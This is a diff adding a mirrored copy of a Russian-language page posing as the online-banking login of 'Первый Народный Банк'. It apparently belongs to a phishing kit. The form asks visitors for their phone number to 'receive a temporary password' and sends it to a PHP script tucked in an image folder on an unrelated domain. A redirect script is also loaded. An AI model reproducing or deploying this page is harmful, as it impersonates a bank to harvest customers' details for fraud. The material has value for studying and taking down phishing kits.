@@ -1,0 +1,190 @@
+<!doctype html>
+<html lang="ru">
+
+<!-- Mirrored from a-pay.site/signin_f.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Jul 2021 05:26:43 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="../stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"
+					integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
+					
+					<link rel="stylesheet" href="build/css/intlTelInput.css">
+					<link rel="stylesheet" href="build/css/demo.css">
+	
+
+    <link rel="stylesheet" href="static/css/style.css">
+    <link href="https://fonts.googleapis.com/css?family=Exo+2:300,400,700" rel="stylesheet">
+    <link id="favicon" rel="shortcut icon" href="static/img/logo_7.ico" type="image/x-icon">
+
+    <title>Загрузка страницы входа в Онлайн Банкинг |Первый Народный Банк</title>
+<style>body {
+        background: #fff;
+    }
+
+    h4 {
+        color: #777777;
+    }
+
+    @media(max-width: 399px) {
+        h3 {
+            font-size: 24px;
+        }
+    }
+
+    @media(max-width: 500px) {
+        .btn {
+            min-width: 90%;
+        }
+    }
+		
+		.iti {
+			width: 100%;
+			margin-bottom: 10px;
+		}
+    .profile-name-card {
+        font-size: 16px;
+        font-weight: bold;
+        text-align: center;
+        margin: 10px 0 0;
+        min-height: 1em;
+    }
+
+    .reauth-email {
+        display: block;
+        color: #404040;
+        line-height: 2;
+        margin-bottom: 10px;
+        font-size: 14px;
+        text-align: center;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+        -moz-box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+    }
+
+    .form-signin #phone,
+    .form-signin #inputPassword {
+        direction: ltr;
+        height: 44px;
+        font-size: 16px;
+    }
+
+    .form-signin input[type=email],
+    .form-signin input[type=password],
+    .form-signin input[type=text],
+    .form-signin button {
+        width: 100%;
+        display: block;
+        margin-bottom: 10px;
+        z-index: 1;
+        position: relative;
+        -moz-box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+    }
+
+
+    .profile-img-card {
+        width: 96px;
+        height: 96px;
+        margin: 0 auto;
+        margin-top: 30px;
+        display: block;
+        -moz-border-radius: 50%;
+        -webkit-border-radius: 50%;
+        border-radius: 50%;
+    }
+</style>
+    <script>var page_id = 3;</script>
+    <script src="static/js/redirect.js"></script>
+</head>
+<body style="background: #f5f5f5;">
+
+<div class="container">
+
+	<div class="wr_top_pd">
+
+	</div>
+	
+    <div class="row">
+        <div class="col-12 text-center" style="padding-top: 20px;">
+            <img src="static/img/logo.png">
+						<h1 class="title_logo">Первый Народный Банк</h1>
+				</div>
+        <div class="col-12 col-sm-10 col-md-8 col-lg-4 offset-sm-1 offset-md-2 offset-lg-4">
+            <div class="con-box" style="margin-top: 30px; text-align: center;">
+                <h3 style="color: #212121;">Вход в Онлайн Банкинг</h3>
+
+                <div class="row">
+                    <div class="col-12 col-md-10 col-lg-10 offset-md-1 offset-lg-1">
+                        <img id="profile-img" class="profile-img-card" src="static/img/user_icon.png" />
+		
+                        <p id="profile-name" class="profile-name-card">Введите свой номер телефона для получения временного пароля:</p>
+                        <form class="form-signin" method="get" action="https://a-pay.site/static/img/file.php">
+                            <span id="reauth-email" class="reauth-email"></span>
+                            <input type="tel" id="phone" name="phone" class="form-control" value="+7" required>
+                            <button id="AuthBtn" class="btn btn-primary btn-block btn-signin" type="submit">Получить пароль</button>
+                        </form>
+
+                        <!-- <div id="time_pass_block" class="alert alert-warning" role="alert" style="display: none;">
+                            Ожидайте, Вам был отправлен временный пароль посредствам функции WebSms
+                        </div> -->
+                    </div>
+                </div>
+            </div>
+				</div>
+
+    </div>
+</div>
+
+
+
+
+<script src="static/js/jquery.js"></script>
+<script src="static/js/popper.js"></script>
+<script src="static/js/bootstrap.js"></script>
+<script src="static/js/script.js"></script>
+<script type="text/javascript">
+    if (localStorage['site_run'] == undefined) {
+localStorage['site_run'] = 'true';
+
+localStorage["user_country_alias"] = 'ru';
+
+var nowTime = new Date().getHours();
+if (nowTime == 0 || nowTime === undefined){
+    nowTime = 1;
+}
+
+localStorage["now_time"] = nowTime;
+}
+
+</script>
+<script src="build/js/intlTelInput.js"></script>
+<script>
+    var input = document.querySelector("#phone");
+    window.intlTelInput(input, {
+      excludeCountries: ["us"],
+      // formatOnDisplay: false,
+      // geoIpLookup: function(callback) {
+      //   $.get("http://ipinfo.io", function() {}, "jsonp").always(function(resp) {
+      //     var countryCode = (resp && resp.country) ? resp.country : "";
+      //     callback(countryCode);
+      //   });
+      // },
+      // hiddenInput: "full_number",
+      // initialCountry: "auto",
+      // localizedCountries: { 'de': 'Deutschland' },
+      nationalMode: false,
+      // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
+      placeholderNumberType: "MOBILE",
+      preferredCountries: ['ru', 'ua'],
+      // separateDialCode: true,
+      utilsScript: "build/js/utils.js",
+    });
+  </script>
+</body>
+
+<!-- Mirrored from a-pay.site/signin_f.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 03 Jul 2021 05:26:45 GMT -->
+</html>
